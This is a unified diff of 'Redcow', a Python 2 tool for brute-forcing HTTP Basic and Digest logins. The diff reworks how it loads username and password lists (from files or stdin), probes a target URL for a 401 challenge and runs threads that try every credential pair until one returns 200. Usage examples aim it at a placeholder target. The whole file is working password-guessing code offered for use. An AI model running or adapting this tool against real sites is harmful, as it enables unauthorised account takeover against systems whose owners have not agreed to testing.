@@ -3,160 +3,200 @@
 import requests
 import argparse
 import os.path
+import select
 import base64
 import ssl
 import sys
 import re
 
+from Queue import Queue
 from requests.auth import HTTPDigestAuth
 from threading import Thread
-from Queue import Queue
 from time import sleep
 
 class Redcow(object):
-
-    def __init__(self, url, userlist, passlist, workers):
+    def __init__(self, url, userlist, passlist, workers, stdin_flag):
         self.url = url
-        self.userlist = self.__parse_list(userlist)
+        self.userlist = userlist
         self.passlist = passlist
-        self.queueCreds = Queue(maxsize=0)
         self.workers = workers
-        self.auth_scheme = ''
-        self.auth_realm = ''
-        self.cracked = False
-        self.attempt = 0
+        self.s_flag = stdin_flag
+        self.credentials = Queue(maxsize=0)
+        self._realm = ''
+        self._schema = ''
 
-        self.__motd()
-        self.__check_url()
-        self.__load_creds()
+        self.__check_target(self.url)
+        self.__parse_credentials()
 
-        print "[>] Starting to attack authentication using %s threads...\n" % (str(self.workers))
+    def __parse_credentials(self):
+        _users = list()
+        _passwords = list()
 
-        for worker in xrange(int(self.workers)):
-            _worker = Thread(target=self.Worker)
-            _worker.daemon = True
-            _worker.start()
+        if self.userlist:
+            self.__write('[?] Parsing Userlist...', True)
+            if os.path.isfile(self.userlist):
+                for user in open(self.userlist):
+                    _users.append(user.rstrip())
+            else:
+                _users.append(self.userlist)
+            sleep(0.5)
+            self.__write('[*] Parsing Userlist... \033[92mDONE\n', True)
 
-    def Worker(self):
+        if self.passlist:
+            self.__write('[?] Parsing Passlist...', True)
+            if os.path.isfile(self.passlist):
+                for passwd in open(self.passlist):
+                    _passwords.append(passwd.rstrip())
+            else:
+                _passwords.append(self.passlist)
+            sleep(0.5)
+            self.__write('[*] Parsing Passlist... \033[92mDONE\n', True)
+
+        if self.s_flag:
+            self.__write('[?] Parsing STDIN Input...', True)
+            if select.select([sys.stdin, ], [], [], 0.0)[0]:
+                for line in sys.stdin:
+                    for x in line.split():
+                        _passwords.append(x.rstrip())
+            sleep(0.5)
+            self.__write('[*] Parsing STDIN Input... \033[92mDONE\n', True)
+
+        self.__write('[?] Loading credentials into Queue...', True)
+        for _user in _users:
+            for _pass in _passwords:
+                _cred = dict(username=_user, password=_pass)
+                self.credentials.put(_cred)
+        sleep(0.5)
+        self.__write('[*] Loading credentials into Queue... \033[92mDONE\n', True)
+
+    def __check_target(self, url=''):
+        if self.url:
+            # self.__motd()
+            self.__write('\n[?] Checking URL for valid response...', True)
+            try:
+                r = requests.get(url)
+            except requests.exceptions.ConnectionError as e:
+                self.__write('[x] Checking URL for valid response... \033[91mFAIL\n', True)
+
+                if str(e.args[0].reason).split(':')[2]:
+                    self.__write('\t[!] Error - %s' % str(e.args[0].reason).split(':')[2])
+                else:
+                    self.__write('\t[!] Error - %s' % str(e.message))
+                sys.exit(1)
+
+            if r.status_code != 401:
+                self.__write('[x] Checking URL for valid response... \033[91mFAIL\n', True)
+                self.__write('\t[!] Error - URL provided does not reply with 401 reponse code. Exiting.')
+                sys.exit(1)
+            else:
+                auth_header = r.headers['www-authenticate']
+                pattern = re.compile(r'''(?:\s*www-authenticate\s*:)?\s*(\w*)\s+realm=['"]([^'"]+)['"]''',
+                                     re.IGNORECASE)
+                auth_group = pattern.match(auth_header)
+                self._schema = auth_group.group(1).lower()
+                self._realm = auth_group.group(2).lower()
+
+                if self._realm:
+                    self.__write('[*] Checking URL for valid response... \033[92mDONE\n', True)
+                    print "\n\t[!] HTTP Authentication Realm:  '%s'" % (self._realm.capitalize())
+                    print "\t[!] HTTP Authentication Schema: '%s'\n" % (self._schema.capitalize())
+                    return
+
+    def breach(self):
         while True:
-            if self.cracked is True:
-                break
-
-            if self.queueCreds.empty() is not True:
-                creds = self.queueCreds.get()
-                self.attempt += 1
-
-                msg = "\t[!] Attempting breach with: USER: \033[1m%15s\033[0m \t PASSWORD: \033[1m%15s\033[0m ( Attempts: %s )" % (creds["username"], creds["password"], str(self.attempt))
-                sys.stdout.write('%s\r' % msg)
-                sys.stdout.flush()
-                sleep(0.025)
-
-                if self.auth_scheme == "basic":
-                    r = requests.get(self.url, auth=(creds["username"], creds["password"]), verify=False)
-                    sleep(0.1)
-                elif self.auth_scheme == "digest":
-                    r = requests.get(self.url, auth=HTTPDigestAuth(creds["username"], creds["password"]), verify=False)
-                    sleep(0.1)
+            while self.credentials.empty() is not True:
+                _cred = self.credentials.get()
+                self.__write('[!] Attempting breach using credentials [User] %15s \t[Pass] %15s' % (
+                _cred['username'], _cred['password']), True)
+                try:
+                    if self._schema == 'basic':
+                        r = requests.post(self.url, auth=(_cred['username'], _cred['password']))
+                    elif self._schema == 'digest':
+                        r = requests.post(self.url, auth=HTTPDigestAuth(_cred['username'], _cred['password']))
+                    else:
+                        r = requests.post(self.url, auth=(_cred['username'], _cred['password']))
+                except requests.exceptions.ConnectionError as e:
+                    if str(e.args[0].reason).split(':')[2]:
+                        self.__write('\t[!] Error - %s' % str(e.args[0].reason).split(':')[2])
+                    else:
+                        self.__write('\t[!] Error - %s' % str(e.message))
+                    del _cred
+                    self.credentials.task_done()
+                    sys.exit(1)
 
                 if r.status_code == 200:
-                    self.cracked = True
-                    print "\n\n\t[!] Breach was a SUCCESS - User [ \033[92m\033[1m%s\033[0m ] - Pass [ \033[92m\033[1m%s\033[0m ]\n" % (creds["username"], creds["password"])
-                    self.queueCreds.task_done()
-                    del creds
-                else:
-                    self.queueCreds.task_done()
-                    del creds
-                    sleep(0.25)
+                    print "\n\n\t\033[92m'%s' Authentication \033[1mBREACH3D!\033[0m\n\t\t       ---\n\t[USER]\033[1m%15s\033[0m\n\t[PASS]\033[1m%15s\033[0m\n" % (self._schema.capitalize(), _cred['username'], _cred['password'])
+                    print "\nWaiting for threads to finish...\n"
+                    save_stdout = sys.stdout
+                    sys.stdout = open('trash', 'w')
+                    del _cred
+                    self.credentials.task_done()
+                    break
+                self.credentials.task_done()
             else:
-                sleep(0.5)
+                sleep(0.25)
 
     def __motd(self):
         data00 = "G1s5Mm0NCg0KICBfICAgICAgXyAgICAgICAgIF8gICAgICAgICAgICAgICAgICBfICAgICAgICAgXyAgICAgICAgICAgIF8gICAgICAgICAgICAgXyAgICAgIA0KL18vXCAgICAvXCBcICAgICAvIC9cICAgICAgICAgICAgICAgIC9cIFwgICAgICAvIC9cICAgICAgICAgL1wgXCAgICAgICAgIC9cIFwgICAgIA0KXCBcIFwgICBcIFxfXCAgIC8gLyAgXCAgICAgICAgICAgICAgLyAgXCBcICAgIC8gLyAgXCAgICAgICAvICBcIFwgICAgICAgLyAgXCBcICAgIA0KIFwgXCBcX18vIC8gLyAgLyAvIC9cIFwgICAgICAgICAgICAvIC9cIFwgXCAgLyAvIC9cIFxfXyAgIC8gL1wgXCBcICAgICAvIC9cIFwgXCAgIA0KICBcIFxfXyBcL18vICAvIC8gL1wgXCBcICAgICAgICAgIC8gLyAvXCBcX1wvIC8gL1wgXF9fX1wgLyAvIC9cIFxfXCAgIC8gLyAvXCBcIFwgIA0KICAgXC9fL1xfXy9cIC9fLyAvICBcIFwgXCAgICAgICAgLyAvXy9fIFwvXy9cIFwgXCBcL19fXy8vIC9fL18gXC9fLyAgLyAvIC8gIFwgXF9cIA0KICAgIF8vXC9fX1wgXFwgXCBcICAgXCBcIFwgICAgICAvIC9fX19fL1wgICAgXCBcIFwgICAgIC8gL19fX18vXCAgICAvIC8gLyAgICBcL18vIA0KICAgLyBfL18vXCBcIFxcIFwgXCAgIFwgXCBcICAgIC8gL1xfX19fXC9fICAgIFwgXCBcICAgLyAvXF9fX19cLyAgIC8gLyAvICAgICAgICAgIA0KICAvIC8gLyAgIFwgXCBcXCBcIFxfX19cIFwgXCAgLyAvIC8gICAgIC9fL1xfXy8gLyAvICAvIC8gL19fX19fXyAgLyAvIC9fX19fX19fXyAgIA0KIC8gLyAvICAgIC9fLyAvIFwgXC9fX19fXCBcIFwvIC8gLyAgICAgIFwgXC9fX18vIC8gIC8gLyAvX19fX19fX1wvIC8gL19fX19fX19fX1wgIA0KIFwvXy8gICAgIFxfXC8gICBcX19fX19fX19fXC9cL18vICAgICAgICBcX19fX19cLyAgIFwvX19fX19fX19fXy9cL19fX19fX19fX19fXy8gIA0KDQobWzBtDQobWzkxbSAgICAgICAgICAgICAgICAgW1JFRENPVzogaHR0cCBhdXRoZW50aWNhdGlvbiBicnV0ZWZvcmNlIHRvb2xdDQobWzBtDQogICAgICAgICAgICAgICAgICAgICAgIGJ5OiAweDY0NjQ1ZkBwcm90b25tYWlsLmNvbQ0KDQo="
         print(base64.b64decode(data00))
 
-    def __parse_list(self, x):
-        if os.path.isfile(x):
-            return ([line.rstrip('\n') for line in open(x)])
+    def __write(self, msg, inplace=False):
+        if msg and inplace is not True:
+            print "\n\033[1m%s\033[0m\n" % (str(msg))
+        elif msg and inplace is True:
+            sys.stdout.write('\033[1m%s\033[0m\r' % msg)
+            sys.stdout.flush()
         else:
-            return list([x])
+            return
 
-    def __load_creds(self):
-        msg = "[>] Building credentials database... "
-        sys.stdout.write('%s\r' % msg)
-        sys.stdout.flush()
-        for _user in self.userlist:
-            if os.path.isfile(self.passlist):
-                with open(self.passlist) as infile:
-                    for line in infile:
-                        creds = dict(username=_user, password=str(line.rstrip()))
-                        self.queueCreds.put(creds)
-            else:
-                creds = dict(username=_user, password=self.passlist)
-                self.queueCreds.put(creds)
+def Usage():
+    print "\n\033[1mUSAGE\033[0m:"
+    print "  %s -t http://target.tld/ -u admin -p /path/to/dict.txt" % (sys.argv[0])
+    print "  %s -t http://target.tld/ -u admin -p /path/to/dict.txt --workers 10" % (sys.argv[0])
+    print "  %s -t http://target.tld/ -u /path/to/users.txt -p /path/to/dict.txt --workers 10" % (sys.argv[0])
+    print "  %s -t http://target.tld/ -u /path/to/users.txt -p /path/to/dict.txt --workers 10 -s" % (sys.argv[0])
+    print "  %s -t http://target.tld/ -u /path/to/users.txt -p /path/to/dict.txt --workers 10 -s -v" % (sys.argv[0])
+    print "\n\033[1mOPTIONS\033[0m:"
+    print "  '-t', '--target'    - The URL containing http_auth scheme to bruteforce"
+    print "  '-u', '--users'     - A username or file containing usernames to attempt"
+    print "  '-p', '--passwords' - A password or file containing passworsd to attempt"
+    print "  '-w', '--workers'   - The number of threads to use during attempt"
+    print "  '-s', '--stdin'     - Boolean flag for allowing STDIN input"
+    print "\n\033[1mNOTES\033[0m:"
+    print "  Either the (-s) or (-p) option must be used in command.\n"
 
-        msg = msg + "\033[92m\033[1mDONE\033[0m"
-        sys.stdout.write('%s\r\n\n' % msg)
-        sys.stdout.flush()
-
-    def __check_url(self):
-        msg = "[>] Checking URL(s) for HTTP_Authentication requests... "
-        sys.stdout.write('%s\r' % msg)
-        sys.stdout.flush()
-        try:
-            r = requests.get(self.url, timeout=10, verify=False)
-        except requests.exceptions.Timeout:
-            msg = msg + "\033[91m\033[1mFAIL\033[0m"
-            sys.stdout.write('%s\r' % msg)
-            sys.stdout.flush()
-            print "\n\n\t[ERROR] - Request timed out. Make sure the URL is not down and try again.\n"
-            sys.exit(1)
-        except requests.exceptions.TooManyRedirects:
-            msg = msg + "\033[91m\033[1mFAIL\033[0m"
-            sys.stdout.write('%s\r' % msg)
-            sys.stdout.flush()
-            print "\n\n\t[ERROR] - Request stuck in redirect loop exception. Check URL for redirect loop.\n"
-            sys.exit(1)
-        except requests.exceptions.RequestException:
-            msg = msg + "\033[91m\033[1mFAIL\033[0m"
-            sys.stdout.write('%s\r' % msg)
-            sys.stdout.flush()
-            print "\n\n\t[ERROR] - Request received a 'Connection Refused' reply. Is this URL service up?\n"
-            sys.exit(1)
-
-        auth_header = r.headers['www-authenticate']
-        auth_objects = re.compile(r'''(?:\s*www-authenticate\s*:)?\s*(\w*)\s+realm=['"]([^'"]+)['"]''', re.IGNORECASE)
-        auth_group = auth_objects.match(auth_header)
-        self.auth_scheme = auth_group.group(1).lower()
-        self.auth_realm = auth_group.group(2)
-
-        if self.auth_scheme != 'basic' and self.auth_scheme != 'digest':
-            print "\n\t[ERROR] - \033[91mAuthentication Scheme not listed as '\033[1mBasic\033[0m' or '\033[1mDigest\033[0m'. Scheme not supported.\033[0m\n"
-            sys.exit(1)
-
-        msg = msg + "\033[92m\033[1mDONE\033[0m"
-        sys.stdout.write('%s\r\n\n' % msg)
-        sys.stdout.flush()
-
-        print "\t[INFO] \033[92m\033[1mHTTP_Authentication URL\033[0m: \033[1m%s\033[0m\n" % self.url
-        print "\t[INFO] \033[92m\033[1mHTTP_Authentication Realm\033[0m: \033[1m%s\033[0m\n" % self.auth_realm.capitalize()
-        print "\t[INFO] \033[92m\033[1mHTTP_Authentication Scheme\033[0m: \033[1m%s\033[0m\n" % self.auth_scheme.capitalize()
+def Error(msg='Undefined Error'):
+    print "\n\033[1m%s\033[0m" % str(msg)
+    Usage()
+    sys.exit(1)
 
 if __name__ == '__main__':
-    requests.packages.urllib3.disable_warnings()
-    parser = argparse.ArgumentParser()
-    auth_group = parser.add_argument_group("Required Arguments")
-    auth_group.add_argument('-t', required="true", dest="target_url", help="Target URL running Web Authentication")
-    auth_group.add_argument('-u', required="true", dest="userlist", help="A username *OR* a file containing a list of users")
-    auth_group.add_argument('-p', required="true", dest="passlist", help="A password *OR* a file containing a list of passwords")
-    parser.add_argument('--threads', dest="threads", help="(Optional) Number of Threads to use. Default: 1")
-    args = parser.parse_args()
+    parser = argparse.ArgumentParser(add_help=False, usage=Usage)
 
+    parser.add_argument('-t', '--target', action='store', dest='t', default='')
+    parser.add_argument('-u', '--users', action='store', dest='u', default='')
+    parser.add_argument('-p', '--passwords', action='store', dest='p', default='')
+    parser.add_argument('-w', '--workers', action='store', dest='w', default=1)
+    parser.add_argument('-s', '--stdin', action='store_true', dest='s_flag', default=False)
+    parser.add_argument('-h', '--help', action='store_true', dest='h_flag', default=False)
 
-    if not args.threads:
-        args.threads = 1
+    try:
+        args = parser.parse_args()
+    except TypeError:
+        Error("The options you provided were not supplied correctly. Please take another look at the examples.")
 
-    if not str(args.target_url).startswith("http"):
-        args.target_url = "http://" + args.target_url
+    if args.h_flag:
+        Usage()
+        sys.exit(1)
+    elif not args.u or not args.t:
+        Error("The options (-u) and (-t) are mandatory, and must be set.")
+    elif not args.p and not args.s_flag:
+        Error("The options (-p) and/or (-s) are mandatory, and must be set.")
 
-    Moo = Redcow(args.target_url, args.userlist, args.passlist, args.threads)
-    Moo.queueCreds.join()
+    MoOo = Redcow(args.t, args.u, args.p, args.w, args.s_flag)
+    for x in xrange(int(args.w)):
+        thread = Thread(target=MoOo.breach)
+        thread.setDaemon(True)
+        thread.start()
+
+    MoOo.credentials.join()
